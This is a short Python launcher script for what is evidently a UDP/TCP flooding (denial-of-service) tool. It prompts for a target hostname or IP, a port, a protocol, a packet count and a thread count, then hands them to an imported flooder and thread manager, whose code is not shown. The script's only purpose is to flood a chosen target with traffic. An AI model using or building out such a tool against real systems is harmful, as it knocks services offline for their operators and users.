import time
from utils.flooder import flooder_selector
from utils.thread_manager import thread_manager


if __name__ == '__main__':
    ip = str(input("Hostname or IP address: "))
    port = int(input("Port: "))
    choice = str(input("UDP or TCP: "))
    packets = int(input("Num of packets in a socket: "))
    threads = int(input("Num of threads: "))

    flooder = flooder_selector(choice)
    thread_manager(threads, flooder, ip, port, packets)

    while True:
        time.sleep(2)
